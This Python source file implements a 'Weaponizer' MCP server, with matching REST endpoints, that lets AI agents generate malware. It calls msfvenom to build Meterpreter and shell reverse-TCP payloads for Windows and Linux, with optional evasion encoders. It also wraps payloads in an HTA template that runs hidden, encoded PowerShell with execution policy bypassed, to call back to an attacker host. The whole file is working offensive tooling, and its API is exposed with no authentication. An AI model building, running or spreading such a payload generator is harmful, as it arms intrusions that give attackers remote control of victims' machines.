"""
Weaponizer MCP Server - Payload Generation for Cyber Kill Chain Stage 2

Generates Metasploit payloads, HTA files, and macro-enabled Office docs.
Uses msfvenom for binary payloads and templates for HTA/macros.

Exposes:
- MCP tools: generate_payload, generate_hta
- REST API: POST /generate, POST /hta (for webapp/agent)
"""

import os
import json
import subprocess
import tempfile
import base64
import threading
from pathlib import Path
from typing import Optional
from http.server import HTTPServer, BaseHTTPRequestHandler

from fastmcp import FastMCP

mcp = FastMCP("weaponizer")

# REST API port for direct HTTP calls (webapp, agent) - separate from MCP SSE port
WEAPONIZER_HTTP_PORT = int(os.getenv("WEAPONIZER_HTTP_PORT", "8014"))

# Payload presets: msfvenom -p <payload> -f <format> -o <out>
PAYLOAD_PRESETS = {
    "windows_meterpreter_reverse_tcp": {
        "payload": "windows/meterpreter/reverse_tcp",
        "formats": ["exe", "dll", "psh", "psh-net", "vba", "vba-exe", "hta-psh"],
        "options": ["LHOST", "LPORT"],
    },
    "windows_shell_reverse_tcp": {
        "payload": "windows/shell_reverse_tcp",
        "formats": ["exe", "psh", "psh-net", "vba"],
        "options": ["LHOST", "LPORT"],
    },
    "linux_meterpreter_reverse_tcp": {
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "formats": ["elf", "elf-so"],
        "options": ["LHOST", "LPORT"],
    },
    "linux_shell_reverse_tcp": {
        "payload": "linux/x64/shell_reverse_tcp",
        "formats": ["elf"],
        "options": ["LHOST", "LPORT"],
    },
}

HTA_TEMPLATE = '''<html>
<head>
<script language="VBScript">
Sub AutoOpen()
    Execute
End Sub
Sub Document_Open()
    Execute
End Sub
Sub Execute()
    Set shell = CreateObject("Wscript.Shell")
    shell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ENCODED_CMD}"
End Sub
</script>
</head>
<body></body>
</html>'''


def _run_msfvenom(
    payload: str,
    lhost: str,
    lport: str,
    format: str = "raw",
    encoder: Optional[str] = None,
    out_file: Optional[str] = None,
    extra_opts: Optional[dict] = None,
) -> tuple[bool, str, Optional[bytes]]:
    """
    Run msfvenom to generate a payload.
    Returns (success, message, raw_bytes or None).
    """
    cmd = ["msfvenom", "-p", payload, "LHOST=" + lhost, "LPORT=" + lport, "-f", format]
    if encoder:
        cmd.extend(["-e", encoder])
    if extra_opts:
        for k, v in extra_opts.items():
            cmd.extend([f"{k}={v}"])
    if out_file:
        cmd.extend(["-o", out_file])

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=120,
            cwd="/tmp",
        )
        if result.returncode != 0:
            return False, result.stderr.decode("utf-8", errors="replace") or "msfvenom failed", None
        if out_file and Path(out_file).exists():
            data = Path(out_file).read_bytes()
            Path(out_file).unlink(missing_ok=True)
            return True, "Payload generated", data
        # Raw output to stdout
        return True, "Payload generated", result.stdout
    except subprocess.TimeoutExpired:
        return False, "msfvenom timed out", None
    except FileNotFoundError:
        return False, "msfvenom not found (run in Kali container)", None
    except Exception as e:
        return False, str(e), None


@mcp.tool()
def generate_payload(
    payload_type: str,
    lhost: str,
    lport: str = "4444",
    format: str = "exe",
    encoder: Optional[str] = None,
    output_format: str = "base64",
) -> str:
    """
    Generate a Metasploit payload for weaponization (Cyber Kill Chain Stage 2).

    Args:
        payload_type: One of: windows_meterpreter_reverse_tcp, windows_shell_reverse_tcp,
            linux_meterpreter_reverse_tcp, linux_shell_reverse_tcp
        lhost: Attacker IP (callback address for reverse payloads)
        lport: Callback port (default 4444)
        format: Output format: exe, dll, elf, psh, vba, raw, etc.
        encoder: Optional encoder (e.g. x86/shikata_ga_nai)
        output_format: "base64" (default) or "path" - base64 returns payload as base64 string;
            path returns temp file path (for large binaries)

    Returns:
        JSON with success, payload (base64 or path), format, size, and any error
    """
    import json

    preset = PAYLOAD_PRESETS.get(payload_type)
    if not preset:
        return json.dumps({
            "success": False,
            "error": f"Unknown payload_type. Use one of: {list(PAYLOAD_PRESETS.keys())}",
        })

    if format not in preset["formats"]:
        return json.dumps({
            "success": False,
            "error": f"Format '{format}' not supported for {payload_type}. Use: {preset['formats']}",
        })

    with tempfile.NamedTemporaryFile(suffix="." + format, delete=False) as f:
        out_path = f.name

    ok, msg, data = _run_msfvenom(
        payload=preset["payload"],
        lhost=lhost,
        lport=lport,
        format=format,
        encoder=encoder,
        out_file=out_path,
    )

    try:
        if not ok:
            return json.dumps({"success": False, "error": msg})

        if data:
            if output_format == "base64" and len(data) < 500_000:
                payload_b64 = base64.b64encode(data).decode("ascii")
                return json.dumps({
                    "success": True,
                    "payload": payload_b64,
                    "format": format,
                    "size": len(data),
                    "payload_type": payload_type,
                })
            else:
                return json.dumps({
                    "success": True,
                    "payload_path": out_path,
                    "format": format,
                    "size": len(data),
                    "payload_type": payload_type,
                    "note": "Payload saved to temp file (use path for large payloads)",
                })
        return json.dumps({"success": False, "error": "No payload data"})
    finally:
        if os.path.exists(out_path) and output_format == "base64":
            try:
                os.unlink(out_path)
            except OSError:
                pass


@mcp.tool()
def generate_hta(
    lhost: str,
    lport: str = "4444",
    payload_type: str = "windows_meterpreter_reverse_tcp",
) -> str:
    """
    Generate an HTA file that executes a PowerShell reverse shell (Meterpreter).

    Args:
        lhost: Attacker IP for callback
        lport: Callback port (default 4444)
        payload_type: windows_meterpreter_reverse_tcp or windows_shell_reverse_tcp

    Returns:
        JSON with success, hta_content (base64), and size
    """
    import json

    preset = PAYLOAD_PRESETS.get(payload_type)
    if not preset or "windows" not in payload_type:
        return json.dumps({"success": False, "error": "Use windows_meterpreter_reverse_tcp or windows_shell_reverse_tcp"})

    # Generate PowerShell payload
    ok, msg, data = _run_msfvenom(
        payload=preset["payload"],
        lhost=lhost,
        lport=lport,
        format="psh",
    )
    if not ok:
        return json.dumps({"success": False, "error": msg})

    ps_script = data.decode("utf-8", errors="replace") if isinstance(data, bytes) else str(data)
    # Encode for PowerShell -Enc (UTF-16LE base64)
    enc_cmd = base64.b64encode(ps_script.encode("utf-16le")).decode("ascii")
    hta = HTA_TEMPLATE.replace("{ENCODED_CMD}", enc_cmd)
    return json.dumps({
        "success": True,
        "hta_content": base64.b64encode(hta.encode()).decode("ascii"),
        "size": len(hta),
    })


# =============================================================================
# REST API - For webapp/agent direct calls
# =============================================================================


class WeaponizerHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for REST payload generation."""

    def do_POST(self):
        if self.path == "/generate":
            self._handle_generate()
        elif self.path == "/hta":
            self._handle_hta()
        else:
            self._send_json(404, {"error": "Not found"})

    def _handle_generate(self):
        try:
            content_len = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_len)
            data = json.loads(body) if body else {}
            payload_type = data.get("payload_type") or data.get("payloadType")
            lhost = data.get("lhost")
            lport = str(data.get("lport", "4444"))
            fmt = data.get("format", "exe")
            encoder = data.get("encoder")
            output_format = data.get("output_format", "base64")
            if not payload_type or not lhost:
                self._send_json(400, {"error": "payload_type and lhost required"})
                return
            result = generate_payload(payload_type, lhost, lport, fmt, encoder, output_format)
            self._send_json(200, json.loads(result))
        except Exception as e:
            self._send_json(500, {"error": str(e)})

    def _handle_hta(self):
        try:
            content_len = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_len)
            data = json.loads(body) if body else {}
            lhost = data.get("lhost")
            lport = str(data.get("lport", "4444"))
            payload_type = data.get("payload_type", "windows_meterpreter_reverse_tcp")
            if not lhost:
                self._send_json(400, {"error": "lhost required"})
                return
            result = generate_hta(lhost, lport, payload_type)
            self._send_json(200, json.loads(result))
        except Exception as e:
            self._send_json(500, {"error": str(e)})

    def _send_json(self, status: int, obj: dict):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())

    def log_message(self, format, *args):
        pass


def start_weaponizer_http(port: int = WEAPONIZER_HTTP_PORT):
    """Start HTTP server for REST API in background."""
    server = HTTPServer(("0.0.0.0", port), WeaponizerHTTPHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[Weaponizer] REST API on port {port}")
    return server


if __name__ == "__main__":
    transport = os.getenv("MCP_TRANSPORT", "stdio")
    if transport == "sse":
        start_weaponizer_http(WEAPONIZER_HTTP_PORT)
    mcp.run(transport=transport)
